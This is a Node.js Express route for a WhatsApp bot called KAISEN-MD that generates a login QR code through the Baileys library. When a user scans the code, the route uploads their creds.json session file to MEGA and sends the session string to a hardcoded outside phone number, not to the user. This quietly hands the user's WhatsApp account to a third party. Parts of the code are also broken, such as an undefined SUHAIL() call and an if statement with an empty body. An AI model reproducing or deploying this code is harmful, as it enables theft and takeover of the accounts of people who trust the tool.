const { exec } = require("child_process");
const { upload } = require('../utils/mega');
const express = require('express');
let router = express.Router()
const pino = require("pino");
let { toBuffer } = require("qrcode");
const path = require('path');
const fs = require("fs-extra");
const { Boom } = require("@hapi/boom");//
const MESSAGE = process.env.MESSAGE || `
╭─❍ *𝐒𝐄𝐒𝐒𝐈𝐎𝐍 𝐂𝐎𝐍𝐍𝐄𝐂𝐓𝐄𝐃 ✅*
├ 🎐 *Bot Name:* 𝐊𝐀𝐈𝐒𝐄𝐍-𝐌𝐃
├ 🍄 *Session:* Secure ID Linked
╰───────────────⬣
╭─❍ *ＤＥＰＬＯＹ ＯＰＴＩＯＮＳ*  
├ ☁️ Railway
├ 🌱 Heroku  
├ 🤍 VPS / Private Server  
├ 🌾 Hosting Panels →
├ 🌧️ katabump.com
├ 🌈 bothosting.net
├ 🍒 optiklink.com 
╰───────────────⬣
╭─❍ *ＬＩＮＫＳ*  
├ 🍓 GitHub →
├ https://github.com/sumon9836/KAISEN-MD
├ 🍉 WhatsApp → 
├ https://chat.whatsapp.com/CQyxExEBMGvEnkA32zqbNY?mode=ac_t  
╰───────────────⬣
`;

  const { default: makeWASocket, useMultiFileAuthState, makeCacheableSignalKeyStore, delay, Browsers, DisconnectReason } = require("@whiskeysockets/baileys");

// Store active sessions
const activeSessions = new Map();

// Clean up auth directory on start
if (fs.existsSync('./auth_info_baileys')) {
    fs.emptyDirSync(__dirname + '/auth_info_baileys');
}

router.get('/', async (req, res) => {
    const sessionId = Date.now().toString();
         async function generateQRSession() {
         const { state, saveCreds } = await useMultiFileAuthState(`./auth_info_baileys`);

        try {
            let socket = makeWASocket({
                 auth: {
                    creds: state.creds,
                    keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "fatal" }).child({ level: "fatal" })),
                },
                printQRInTerminal: false,
                logger: pino({ level: "fatal" }).child({ level: "fatal" }),
                browser: Browsers.macOS("Safari"),
            });

            // Store session reference
            activeSessions.set(sessionId, { socket });

            socket.ev.on('creds.update', saveCreds);

            socket.ev.on("connection.update", async (update) => {
                const { connection, lastDisconnect, qr } = update;

                if (qr && !res.headersSent) {
                    try {
                        const qrBuffer = await toBuffer(qr);
                        const qrBase64 = `data:image/png;base64,${qrBuffer.toString('base64')}`;

                        return res.json({
                            success: true,
                            qr: qrBase64,
                            sessionId: sessionId
                        });
                    } catch (error) {
                        console.error("Error generating QR Code:", error);
                        return res.status(500).json({
                            success: false,
                            error: "Failed to generate QR code"
                        });
                    }
                }

                if (connection === "open") {
                    try {
                        await delay(3000);
                        // Send message to fixed numbe
                         if (fs.existsSync('./auth_info_baileys/creds.json'));
                           const auth_path = './auth_info_baileys/';
        let user = '917003816486@s.whatsapp.net';

                        function randomMegaId(length = 6, numberLength = 4) {
                            const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
                            let result = '';
                            for (let i = 0; i < length; i++) {
                                result += characters.charAt(Math.floor(Math.random() * characters.length));
                            }
                            const number = Math.floor(Math.random() * Math.pow(10, numberLength));
                            return `${result}${number}`;
                        }

                      
             const mega_url = await upload(fs.createReadStream(auth_path + 'creds.json'), `${randomMegaId()}.json`);
                            const string_session = mega_url.replace('https://mega.nz/file/', '');

                            let msgsss = await socket.sendMessage(user, { text: "KAISEN~" + string_session });
                            await socket.sendMessage(user, { text: MESSAGE }, { quoted: msgsss });
                        

                         await delay(1000);
                        try { await fs.emptyDirSync(__dirname + '/auth_info_baileys'); } catch (e) {}

                    } catch (e) {
                        console.log("Error during file upload or message send: ", e);
                    }

                    await delay(100);
                    await fs.emptyDirSync(__dirname + '/auth_info_baileys');
                }

                // Handle connection closures
                if (connection === "close") {
                    let reason = new Boom(lastDisconnect?.error)?.output.statusCode;
                    if (reason === DisconnectReason.connectionClosed) {
                        console.log("Connection closed!");
                    } else if (reason === DisconnectReason.connectionLost) {
                        console.log("Connection Lost from Server!");
                    } else if (reason === DisconnectReason.restartRequired) {
                        console.log("Restart Required, Restarting...");
                        SUHAIL().catch(err => console.log(err));
                    } else if (reason === DisconnectReason.timedOut) {
                        console.log("Connection TimedOut!");
                    } else {
                        console.log('Connection closed with bot. Please run again.');
                        console.log(reason);
                        await delay(5000);
                        exec('pm2 restart qasim');
                    }
                }
            });

        } catch (err) {
            console.log("Error in QR session:", err);
            exec('pm2 restart qasim');
            generateQRSession();
            await fs.emptyDirSync(__dirname + '/auth_info_baileys');
            if (!res.headersSent) {
                res.status(500).json({
                    success: false,
                    error: "Failed to initialize WhatsApp connection"
                });
            }
        }
    }
    await generateQRSession();

});

 
module.exports = router;